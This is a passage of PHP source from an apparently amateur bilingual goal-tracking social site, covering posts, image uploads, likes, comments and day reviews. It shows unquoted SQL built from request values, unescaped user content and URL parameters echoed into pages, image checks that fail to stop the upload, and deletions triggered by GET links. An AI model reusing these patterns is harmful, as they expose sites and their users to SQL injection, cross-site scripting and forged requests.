									$output_wrong_format = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
									break;
									
									case 'english':
									$output_success = "Post submitted.";
									$output_no_content = "Please fill in all fields.";
									$output_not_author = "You are not the author of this goal.";
									$output_no_goal = "There is no such goal.";
									$output_no_image = "The chosen file is not an image.";
									$output_too_big = "The chosen file is too big. Maximum size: 5Mb.";
									$output_wrong_format = "Only JPG, JPEG and PNG files are allowed.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_POST['goalid']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$goal = mysqli_fetch_array($check_goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										if(empty($_POST['content']))
										{
											echo $output_no_content;
										}else
										{
											$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
											$time = time();
											// check if file has been chosen
											if(empty($_FILES['picture1']['tmp_name']) AND empty($_FILES['picture2']['tmp_name']) AND empty($_FILES['picture3']['tmp_name']) AND empty($_FILES['picture4']['tmp_name']) AND empty($_FILES['picture5']['tmp_name']))
											{
												mysqli_query($mysql_connection, "INSERT INTO posts (type, userid, goalid, time, content, picture) VALUES ('0', '".$userdata['id']."', '".$goalid."', '".$time."','$content', 0)");
												echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
												exit;
											}else
											{
												$target_dir = "uploads/posts/";
												for($iter = 1; $iter <= 5; $iter++)
												{
													$picture_name = "picture".$iter;
													if(!empty($_FILES[$picture_name]['tmp_name']))
													{
														$target_file[$iter] = $target_dir . basename($_FILES[$picture_name]["name"]);
														$image_File_Type[$iter] = pathinfo($target_file[$iter],PATHINFO_EXTENSION);
														$image_check[$iter] = 1;
														// Check if image file is an actual image or fake image
														if(getimagesize($_FILES[$picture_name]['tmp_name']) == false) 
														{
															echo $output_no_image;
															break;
														}
														// Check file size
														if ($_FILES[$picture_name]['size'] > 5000000)
														{
															echo $output_too_big;
															break;
														}
														// Allow certain file formats
														if($image_File_Type[$iter] != "jpg" && $image_File_Type[$iter] != "png" && $image_File_Type[$iter] != "jpeg" && $image_File_Type[$iter] != "JPG" && $image_File_Type[$iter] != "PNG" && $image_File_Type[$iter] != "JPEG")
														{
															echo $output_wrong_format;
															break;
														}
													}else
													{
														$image_check[$iter] = 0;
													}
												}
												mysqli_query($mysql_connection, "INSERT INTO posts (type, userid, goalid, time, content, picture) VALUES ('0', '".$userdata['id']."', '".$goalid."', '".$time."','$content', 1)");
												$post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE goalid = ".$goalid." AND time = ".$time." LIMIT 1");
												$post = mysqli_fetch_array($post_query);
												// No error, upload file
												for($iter = 1; $iter <= 5; $iter++)
												{
													if($image_check[$iter])
													{
														$picture_name = "picture".$iter;
														move_uploaded_file($_FILES[$picture_name]['tmp_name'], $target_dir."post_".$post['id']."_".$iter.".".$image_File_Type[$iter]);
													}
												}
												echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
												exit;
											}
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'edit_post':
								switch($_GET['language'])
								{
									case 'german':
									$label_content = "Beitrag";
									$label_picture = "Bild hinzufügen";
									$input_submit = "Beitrag bearbeiten";
									$output_not_author = "Du bist nicht der Autor dieses Beitrages.";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									break;
									
									case 'english':
									$label_content = "Content";
									$label_picture = "Add picture";
									$input_submit = "Edit post";
									$output_not_author = "You are not the author of this post.";
									$output_no_post = "There is no such post.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid, content FROM posts where id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									if($post['userid'] == $userdata['id'])
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_edit_post&postid=".$postid."\" method=\"post\" accept-charset=\"utf-8\">";
													echo "<label>".$label_content."</label>";
													echo "<textarea name=\"content\" cols=\"64\" rows=\"15\">".$post['content']."</textarea>";
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'submit_edit_post':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Beitrag bearbeitet.";
									$output_no_content = "Bitte alle Felder ausfüllen.";
									$output_not_author = "Du bist nicht der Autor dieses Beitrages.";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									break;
									
									case 'english':
									$output_success = "Post editet.";
									$output_no_content = "Please fill in all fields.";
									$output_not_author = "You are not the author of this post.";
									$output_no_post = "There is no such post.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									if($post['userid'] == $userdata['id'])
									{
										if(empty($_POST['content']))
										{
											echo $output_no_content;
										}else
										{
											$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
											mysqli_query($mysql_connection, "UPDATE posts SET content = '$content' WHERE id = ".$postid);
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$postid."'; </script>";
											exit;
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'delete_post':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Beitrag gelöscht.";
									$output_not_author = "Du bist nicht der Autor dieses Beitrages.";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									$output_security_check = "Willst du diesen Beitrag wirklich löschen?";
									$a_security_check = "Beitrag löschen";
									break;
									
									case 'english':
									$output_success = "Post deleted.";
									$output_not_author = "You are not the author of this post.";
									$output_no_post = "There is no such post.";
									$output_security_check = "Are you sure you want to delete this post";
									$a_security_check = "Delete post";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid,type,picture FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									if($post['userid'] == $userdata['id'])
									{
										if(!empty($_GET['security_check']))
										{
											if($post['type'])
											{
												mysqli_query($mysql_connection, "DELETE FROM posts WHERE id = ".$postid);
												mysqli_query($mysql_connection, "DELETE FROM likes WHERE postid = ".$postid);
												mysqli_query($mysql_connection, "DELETE FROM comments WHERE postid = ".$postid);
												mysqli_query($mysql_connection, "DELETE FROM scheduleblocks WHERE postid = ".$postid);
											}else
											{
												mysqli_query($mysql_connection, "DELETE FROM posts WHERE id = ".$postid);
												mysqli_query($mysql_connection, "DELETE FROM likes WHERE postid = ".$postid);
												mysqli_query($mysql_connection, "DELETE FROM comments WHERE postid = ".$postid);
											}
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
											exit;
										}else
										{
											echo $output_security_check;
											echo " <a href=\"login.php?language=".$_GET['language']."&action=delete_post&postid=".$postid."&security_check=true\">".$a_security_check."</a>";
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'like_post':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_post = "Dieser Post exisitert nicht.";
									break;
									
									case 'english':
									$output_no_post = "There is no such post.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									$like_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$postid." AND userid = ".$userdata['id']." LIMIT 1");
									if(!mysqli_num_rows($like_query))
									{
										$time = time();
										mysqli_query($mysql_connection, "INSERT INTO likes (authorid, postid, userid, time, new) VALUES ('".$post['userid']."', '".$postid."', '".$userdata['id']."', '".$time."', 1)");
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
										exit;
									}else
									{	
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
										exit;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'dislike_post':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_post = "Dieser Post exisitert nicht.";
									break;
									
									case 'english':
									$output_no_post = "There is no such post.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$check_post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($check_post_query))
								{
									$check_like_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$postid." AND userid = ".$userdata['id']." LIMIT 1");
									if(mysqli_num_rows($check_like_query))
									{
										mysqli_query($mysql_connection, "DELETE FROM likes WHERE postid = ".$postid." AND userid = ".$userdata['id']);
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
										exit;
									}else
									{
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=feed'; </script>";
										exit;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'likes':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_post = "Dieser Post exisitert nicht.";
									$output_name = "Name";
									$output_no_likes = "Keine Gefällt mir.";
									break;
									
									case 'english':
									$output_no_post = "There is no such post.";
									$output_name = "Name";
									$output_no_likes = "No likes.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$check_post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($check_post_query))
								{
									$like_query = mysqli_query($mysql_connection, "SELECT userid FROM likes WHERE postid = ".$postid);
									if(mysqli_num_rows($like_query) >= 1)
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<div class=\"list\">";
													echo "<div class=\"onecolumn\">";
														while($like = mysqli_fetch_array($like_query))
														{
															$user_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$like['userid']);
															$user = mysqli_fetch_array($user_query);
															echo "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$like['userid']."\">".$user['name']." ".$user['surname']."</a>";
														}
													echo "</div>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_no_likes;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'write_comment':
								switch($_GET['language'])
								{
									case 'german':
									$input_submit = "Kommentar abschicken";
									$output_no_post = "Dieser Beitrag existiert nicht.";
									break;
									
									case 'english':
									$input_submit = "Send comment";
									$output_no_post = "There is no such post.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$check_post_query = mysqli_query($mysql_connection, "SELECT id FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($check_post_query))
								{
									echo "<div class=\"block\">";
										echo "<div class=\"innerblock\">";
											echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_comment&postid=".$postid."\" method=\"post\" accept-charset=\"utf-8\">";
												echo "<textarea name=\"comment\"></textarea>";
												echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
											echo "</form>";
										echo "</div>";
									echo "</div>";
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'submit_comment':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_post = "Dieser Post existiert nicht.";
									$output_comment_empty = "Bitte fülle das Kommentarfeld aus.";
									break;
									
									case 'english':
									$output_no_post = "There is no such post.";
									$output_comment_empty = "Please fill in the comment field.";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT userid FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{	
									$post = mysqli_fetch_array($post_query);
									$comment = mysqli_real_escape_string($mysql_connection, $_POST['comment']);
									if(!empty($comment))
									{
										mysqli_query($mysql_connection, "INSERT INTO comments (authorid, postid, userid, time, text, new) VALUES ('".$post['userid']."', '$postid', '".$userdata['id']."', '".time()."', '$comment', 1)");
										echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$postid."'; </script>";
										exit;
									}else
									{
										echo $output_comment_empty;
									}
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'edit_comment':
								switch($_GET['language'])
								{
									case 'german':
									$input_submit = "Kommentar bearbeiten";
									$output_not_author = "Du bist nicht der Autor dieses Kommentars.";
									$output_no_comment = "Dieser Kommentar existiert nicht.";
									break;
									
									case 'english':
									$input_submit = "Edit comment";
									$output_not_author = "You are not the author of this comment.";
									$output_no_comment = "There is no such comment.";
									break;
								}
								$commentid = mysqli_real_escape_string($mysql_connection, $_GET['commentid']);
								$comment_query = mysqli_query($mysql_connection, "SELECT userid, text FROM comments WHERE id = ".$commentid." LIMIT 1");
								if(mysqli_num_rows($comment_query))
								{
									$comment = mysqli_fetch_array($comment_query);
									if($comment['userid'] == $userdata['id'])
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_edit_comment&commentid=".$commentid."\" method=\"post\" accept-charset=\"utf-8\">";
													echo "<textarea name=\"comment\">".$comment['text']."</textarea>";
													echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_comment;
								}
								break;
								
								case 'submit_edit_comment':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Kommentar bearbeitet.";
									$output_not_author = "Du bist nicht der Autor dieses Kommentars.";
									$output_no_comment = "Dieser Kommentar existiert nicht.";
									$output_comment_empty = "Bitte fülle alle Felder aus.";
									break;
									
									case 'english':
									$output_success = "Comment edited.";
									$output_not_author = "You are not the author of this comment.";
									$output_no_comment = "There is no such comment.";
									$output_comment_empty = "Please fill in all the fields.";
									break;
								}
								$commentid = mysqli_real_escape_string($mysql_connection, $_GET['commentid']);
								$comment_query = mysqli_query($mysql_connection, "SELECT postid, userid FROM comments WHERE id = ".$commentid." LIMIT 1");
								if(mysqli_num_rows($comment_query))
								{
									$comment = mysqli_fetch_array($comment_query);
									if($comment['userid'] == $userdata['id'])
									{
										$new_comment = mysqli_real_escape_string($mysql_connection, $_POST['comment']);
										if(!empty($new_comment))
										{
											mysqli_query($mysql_connection, "UPDATE comments SET text = '$new_comment' WHERE id = ".$commentid);
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$comment['postid']."'; </script>";
											exit;
										}else
										{
											echo $output_comment_empty;
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_comment;
								}
								break;
								
								case 'delete_comment':
								switch($_GET['language'])
								{
									case 'german':
									$output_not_author = "Du bist nicht der Autor dieses Kommentars.";
									$output_no_comment = "Dieser Kommentar existiert nicht.";
									$output_security_check = "Willst du diesen Kommentar wirklich löschen?";
									$a_security_check = "Kommentar löschen";
									break;
									
									case 'english':
									$output_not_author = "You are not the author of this comment.";
									$output_no_comment = "There is no such comment.";
									$output_security_check = "Are you sure you want to delete this comment?";
									$a_security_check = "Delete comment";
									break;
								}
								$commentid = mysqli_real_escape_string($mysql_connection, $_GET['commentid']);
								$comment_query = mysqli_query($mysql_connection, "SELECT userid FROM comments WHERE id = ".$commentid." LIMIT 1");
								if(mysqli_num_rows($comment_query))
								{
									$comment = mysqli_fetch_array($comment_query);
									if($comment['userid'] == $userdata['id'])
									{
										if(!empty($_GET['security_check']))
										{
											mysqli_query($mysql_connection, "DELETE FROM comments WHERE id = ".$commentid);
											echo "<script> location.href='login.php?language=".$_GET['language']."&action=post&postid=".$_GET['postid']."'; </script>";
											exit;
										}else
										{
											echo $output_security_check;
											echo " <a href=\"login.php?language=".$_GET['language']."&action=delete_comment&commentid=".$commentid."&postid=".$_GET['postid']."&security_check=true\">".$a_security_check."</a>";
										}
									}else
									{
										echo $output_not_author;
									}
								}else
								{
									echo $output_no_comment;
								}
								break;
								
								case 'post':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_post = "Dieser Post exisitert nicht.";
									$a_like = "Gefällt mir";
									$a_dislike = "Gefällt mir nicht mehr";
									$a_likes = "Gefällt";
									$output_comments = "Kommentare";
									$output_write_comment = "Kommentar schreiben";
									$input_submit = "Kommentar abschicken";
									$a_edit_comment = "Bearbeiten";
									$a_delete_comment = "Löschen";
									break;
									
									case 'english':
									$output_no_post = "There is no such post.";
									$a_like = "Like";
									$a_dislike = "Dislike";
									$a_likes = "Likes";
									$output_comments = "Comments";
									$output_write_comment = "Write a comment";
									$input_submit = "Send comment";
									$a_edit_comment = "Edit";
									$a_delete_comment = "Delete";
									break;
								}
								$postid = mysqli_real_escape_string($mysql_connection, $_GET['postid']);
								$post_query = mysqli_query($mysql_connection, "SELECT * FROM posts WHERE id = ".$postid." LIMIT 1");
								if(mysqli_num_rows($post_query))
								{
									$post = mysqli_fetch_array($post_query);
									$goal_query = mysqli_query($mysql_connection, "SELECT id, title FROM goals WHERE id=".$post['goalid']." LIMIT 1");
									$goaldata = mysqli_fetch_array($goal_query);
									$likes_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$post['id']);
									$liked_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$post['id']." AND userid=".$userdata['id']." LIMIT 1");
									if($post['type'] == 0)
									{
										echo "<div class=\"block\">";
											echo "<div class=\"feed\">";
												echo "<div class=\"header\">";
													echo "<div class=\"time\">";
														echo date("d.m.Y - H:i", $post['time']);
													echo "</div>";
													echo "<div class=\"feedtitle\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goaldata['id']."\">".$goaldata['title']."</a>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"content\">";
													if($picture_file = glob("uploads/posts/post_".$post['id']."_*.*"))
													{
														$show_file = "";
														echo "<div class=\"picture\">";
															foreach($picture_file as $picture)
															{
																$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
															}
															echo $show_file;
													echo "</div>";
													}
													echo "<div class=\"post\">";
														echo "<div class=\"text\">";
															$post['content']=str_replace("\n","<br>",$post['content']);
															echo $post['content'];
														echo "</div>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"links\">";
													echo "<div class=\"left\">";
														if(mysqli_num_rows($liked_query))
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=dislike_post&postid=".$post['id']."\">".$a_dislike."</a>";
														}else
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=like_post&postid=".$post['id']."\">".$a_like."</a>";
														}
													echo "</div>";
													echo "<div class=\"right\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=likes&postid=".$post['id']."\">".$a_likes."(".mysqli_num_rows($likes_query).")</a>";
													echo "</div>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
										echo "<br>";
									}else
									{
										$schedule_query = mysqli_query($mysql_connection, "SELECT * FROM scheduleblocks WHERE postid = ".$post['id']." ORDER BY starttime ASC");
										echo "<div class=\"block\">";
											echo "<div class=\"feed\">";
												echo "<div class=\"header\">";
													echo "<div class=\"time\">";
														echo date("d.m.Y - H:i", $post['time']);
													echo "</div>";
													echo "<div class=\"title\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goaldata['id']."\">".$goaldata['title']."</a>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"content\">";
														if($picture_file = glob("uploads/posts/post_".$post['id']."_*.*"))
														{
															$show_file = "";
															echo "<div class=\"picture\">";
																foreach($picture_file as $picture)
																{
																	$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
																}
																echo $show_file;
															echo "</div>";
														}
													echo "<div class=\"post\">";
														echo "<div class=\"schedule\">";
															echo "<table border=\"1\">";
															$iter = 0;
															while($schedule = mysqli_fetch_array($schedule_query))
															{
																if($iter%2 == 1)
																{
																	$bgcolor = "#808080";
																}else
																{
																	$bgcolor = "#BFBFBF";
																}
																$actionblock_query = mysqli_query($mysql_connection, "SELECT name FROM actionblocks WHERE id = ".$schedule['actionblockid']." LIMIT 1");
																$actionblock = mysqli_fetch_array($actionblock_query);
																echo "<tr bgcolor=\"".$bgcolor."\"><td>".date("H:i",$schedule['starttime'])."-".date("H:i",$schedule['finishtime'])."</td><td>".$actionblock['name']."</td></tr>";
																$iter++;
															}
															echo "</table>";
														echo "</div>";
														echo "<div class=\"text\">";
															$post['content']=str_replace("\n","<br>",$post['content']);
															echo $post['content'];
														echo "</div>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"links\">";
													echo "<div class=\"left\">";
														if(mysqli_num_rows($liked_query))
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=dislike_post&postid=".$post['id']."\">".$a_dislike."</a>";
														}else
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=like_post&postid=".$post['id']."\">".$a_like."</a>";
														}
													echo "</div>";
													echo "<div class=\"right\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=likes&postid=".$post['id']."\">".$a_likes."(".mysqli_num_rows($likes_query).")</a>";
													echo "</div>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
										echo "<br>";
									}
									$comment_query = mysqli_query($mysql_connection, "SELECT * FROM comments WHERE postid=".$postid." ORDER BY time ASC");
									if(mysqli_num_rows($comment_query) >= 1)
									{
										echo "<b>".$output_comments."</b>";
										while($comment = mysqli_fetch_array($comment_query))
										{
											$user_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$comment['userid']." LIMIT 1");
											$user = mysqli_fetch_array($user_query);
											echo "<div class=\"block\">";
												echo "<div class=\"feed\">";
													echo "<div class=\"header\">";
														echo "<div class=\"time\">";
															echo date("d.m.Y - H:i", $comment['time']);
														echo "</div>";
														echo "<div class=\"title\">";
															echo "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$comment['userid']."\">".$user['name']." ".$user['surname']."</a>";
														echo "</div>";
													echo "</div>";
													echo "<div class=\"content\">";
														echo "<div class=\"post\">";
															echo "<div class=\"text\">";
																$comment['text']=str_replace("\n","<br>",$comment['text']);
																echo $comment['text'];
															echo "</div>";
														echo "</div>";
													echo "</div>";
													if($comment['userid'] == $userdata['id'])
													{
														echo "<div class=\"links\">";
															echo "<div class=\"owner\">";
																echo "<a href=\"login.php?language=".$_GET['language']."&action=edit_comment&commentid=".$comment['id']."\">".$a_edit_comment."</a>";
																echo "<a href=\"login.php?language=".$_GET['language']."&action=delete_comment&commentid=".$comment['id']."&postid=".$postid."\">".$a_delete_comment."</a>";
															echo "</div>";
														echo "</div>";
													}
												echo "</div>";
											echo "</div>";
											echo "<br>";
										}
									}
									echo "<b>".$output_write_comment."</b>";
									echo "<div class=\"block\">";
										echo "<div class=\"innerblock\">";
											echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_comment&postid=".$postid."\" method=\"post\" accept-charset=\"utf-8\">";
												echo "<textarea name=\"comment\"></textarea>";
												echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
											echo "</form>";
										echo "</div>";
									echo "</div>";
								}else
								{
									echo $output_no_post;
								}
								break;
								
								case 'createdayreview':
								switch($_GET['language'])
								{
									case 'german':
									$label_actionblock = "Aktionsblock";
									$label_start = "Von";
									$label_end = "Bis";
									$label_content = "Beitrag";
									$label_goal = "Ziel";
									$output_pictures = "Bilder hinzufügen";
									$input_submit = "Beitrag teilen";
									$input_submit_choose_goal = "Ziel wählen";
									$output_no_blocks = "Du hast noch keinen Aktionsblock für dieses Ziel definiert.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_no_goal_yet = "Du hast noch kein Ziel definiert.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$a_add_block = "Aktionsblock hinzufügen";
									break;
									
									case 'english':
									$label_actionblock = "Actionblock";
									$label_start = "Started";
									$label_end = "Finished";
									$label_content = "Content";
									$label_goal = "Goal";
									$output_pictures = "Add pictures";
									$input_submit = "Post";
									$input_submit_choose_goal = "Choose goal";
									$output_no_blocks = "You have not yet defined an actionblock for this goal.";
									$output_no_goal = "There is no such goal.";
									$output_no_goal_yet = "You haven't defined a goal yet.";
									$output_not_author = "You are not the author of this goal.";
									$a_add_block = "Add actionblock";
									break;
								}
								if(empty($_POST['goalid']))
								{
									
									$goal_query = mysqli_query($mysql_connection, "SELECT id,title FROM goals WHERE userid = ".$userdata['id']);
									if(mysqli_num_rows($goal_query) >= 1)
									{
										echo "<div class=\"block\">";
											echo "<div class=\"innerblock\">";
												echo "<form action=\"login.php?language=".$_GET['language']."&action=createdayreview\" method=\"post\" accept-charset=\"utf-8\">";
													echo "<label>".$label_goal."</label>";
													echo "<select name=\"goalid\" size=\"1\">";
														while($goal = mysqli_fetch_array($goal_query))
														{
															echo "<option value=\"".$goal['id']."\">".$goal['title']."</option>";
														}
													echo "</select>";
													echo "<br>";
													echo "<span><input type=\"submit\" value=\"".$input_submit_choose_goal."\"></input></span>";
												echo "</form>";
											echo "</div>";
										echo "</div>";
									}else
									{
										echo $output_no_goal_yet;
									}
								}else
								{
									$goalid = mysqli_real_escape_string($mysql_connection, $_POST['goalid']);
									$check_goal_query = mysqli_query($mysql_connection, "SELECT id,userid FROM goals WHERE id = ".$goalid." LIMIT 1");
									if(mysqli_num_rows($check_goal_query))
									{
										$goal = mysqli_fetch_array($check_goal_query);
										if($goal['userid'] == $userdata['id'])
										{
											$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = ".$goal['id']);
											if(mysqli_num_rows($actionblock_query) >= 1)
											{
												echo "<div class=\"block\">";
													echo "<div class=\"innerblock\">";
														echo "<div class=\"schedule\">";
															echo "<form action=\"login.php?language=".$_GET['language']."&action=submitdayreview&goalid=".$goal['id']."\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\">";
																$actionblock_query = mysqli_query($mysql_connection, "SELECT * FROM actionblocks WHERE goalid = ".$goal['id']);
																$iter = 1;
																echo "<h><span>".$label_actionblock."</span><span>".$label_start."</span><span>".$label_end."</span></h>";
																while($actionblock = mysqli_fetch_array($actionblock_query))
																{
																	$actionblock_array[$iter] = $actionblock;
																	$iter++;
																}
																for($iter = 1; $iter <= 10; $iter++)
																{
																	echo "<h><select name=\"actionblock".$iter."\" size=\"1\">";
																		for($actionblock_iter = 1; $actionblock_iter <= sizeof($actionblock_array); $actionblock_iter++)
																		{
																			echo "<option value=\"".$actionblock_array[$actionblock_iter]['id']."\">".$actionblock_array[$actionblock_iter]['name']."</option>";
																		}
																	echo "</select>";
																	echo "<select name=\"starttime".$iter."\" size=\"1\">";
																	$time_midnight = 82800;
																	for($timeiter = 0; $timeiter <= 95; $timeiter++)
																	{
																		$time = date("H:i",$time_midnight+$timeiter*900);
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																	}
																	echo "</select>";
																	echo "<select name=\"finishtime".$iter."\" size=\"1\">";
																	for($timeiter = 0; $timeiter <= 95; $timeiter++)
																	{
																		$time = date("H:i",$time_midnight+$timeiter*900);
																		echo "<option value=\"".($time_midnight+$timeiter*900)."\">".$time."</option>";
																	}
																	echo "</select></h>";
																}
																echo "<h><label>".$label_content."</label>";
																echo "<textarea name=\"content\"></textarea></h>";
																echo "<br><br>";
																echo $output_pictures;
																echo "<h><p><input type=\"file\" name=\"picture\"></input></p></h>";
																echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
															echo "</form>";
														echo "</div>";
													echo "</div>";
												echo "</div>";
											}else
											{
												echo $output_no_blocks;
												echo "<br><a href=\"login.php?language=".$_GET['language']."&action=addblock&goalid=".$goalid."\">".$a_add_block."</a>";
											}
										}else
										{
											echo $output_not_author;
										}
									}else
									{
										echo $output_no_goal;
									}
								}
								break;
								
								case 'submitdayreview':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_success = "Tagesrückblick gepostet.";
									$output_no_image = "Die ausgewählte Datei ist kein Bild.";
									$output_too_big = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
									$output_wrong_format = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
									$output_no_content = "Bitte füll die Felder Titel und Beitrag aus.";
									break;
									
									case 'english':
									$output_no_goal = "There is no such goal.";
									$output_not_author = "You are not the author of this goal.";
									$output_success = "Day review posted.";
									$output_no_image = "The chosen file is not an image.";
									$output_too_big = "The chosen file is too big. Maximum size: 5Mb.";
									$output_wrong_format = "Only JPG, JPEG and PNG files are allowed.";
									$output_no_content = "Please fill in the fields title and content.";
									break;
								}
								$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
								$check_goal_query = mysqli_query($mysql_connection, "SELECT id,userid FROM goals WHERE id = ".$goalid." LIMIT 1");
								if(mysqli_num_rows($check_goal_query))
								{
									$goal = mysqli_fetch_array($check_goal_query);
									if($goal['userid'] == $userdata['id'])
									{
										if(!empty($_POST['content']))
										{
											$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
											// check if file has been chosen
											if(empty($_FILES['picture']['tmp_name']))
											{
												$time = time();
